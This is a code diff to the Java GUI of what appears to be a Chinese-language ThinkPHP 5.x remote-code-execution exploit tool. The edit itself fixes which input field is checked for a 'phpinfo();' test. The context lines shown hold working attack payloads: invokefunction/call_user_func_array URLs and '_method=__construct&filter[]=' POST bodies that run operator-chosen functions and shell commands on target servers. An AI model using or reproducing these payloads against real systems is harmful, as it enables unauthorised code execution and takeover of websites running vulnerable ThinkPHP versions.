@@ -169,7 +169,7 @@ public class Gui {
             }
         }else if(GetChionsVuln().equals("第五种 5.1.x RCE")){
             textArea1.append("此漏洞不支持 执行php形式payload，要是执行命令，请直接在pyload里输入命令即可。要是执行phpinfo();，输入phpinfo();即可。\n");
-            if(filenameText.getText().equals("phpinfo();")) {
+            if(phpinfoTextField1.getText().equals("phpinfo();")) {
                 Url= GetUrl("?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1");
             }else{
                 Url= GetUrl("?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]="+textField2.getText()+"&vars[1][]="+ phpinfoTextField1.getText().toString());
@@ -182,7 +182,7 @@ public class Gui {
             }
         }else if(GetChionsVuln().equals("第六种 5.1.x RCE")){
             textArea1.append("此漏洞不支持 执行php形式payload，要是执行命令，请直接在pyload里输入命令即可。要是执行phpinfo();，输入phpinfo();即可。\n");
-            if(filenameText.getText().equals("phpinfo();")) {
+            if(phpinfoTextField1.getText().equals("phpinfo();")) {
                 Url= GetUrl("?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1");
             }else{
                 Url= GetUrl("?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]="+textField2.getText()+"&vars[1][]="+ phpinfoTextField1.getText().toString());
@@ -197,7 +197,7 @@ public class Gui {
         }else if(GetChionsVuln().equals("第七种 5.x RCE")){
             String Payload;
             Url=GetUrl("/index.php?s=captcha");
-            if(filenameText.getText().equals("phpinfo();")) {
+            if(phpinfoTextField1.getText().equals("phpinfo();")) {
                 Payload = "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=-1";
             }else{
                 Payload = "_method=__construct&filter[]="+textField2.getText()+"&method=get&server[REQUEST_METHOD]="+phpinfoTextField1.getText();
@@ -212,7 +212,7 @@ public class Gui {
         }else if(GetChionsVuln().equals("第八种 5.x RCE")){
             String Payload;
             Url=GetUrl("/index.php?s=captcha");
-            if(filenameText.getText().equals("phpinfo();")) {
+            if(phpinfoTextField1.getText().equals("phpinfo();")) {
                 Payload = "_method=__construct&method=get&filter[]=phpinfo&get[]=-1";
             }else{
                 Payload = "_method=__construct&method=get&filter[]="+textField2.getText()+"&get[]="+phpinfoTextField1.getText();
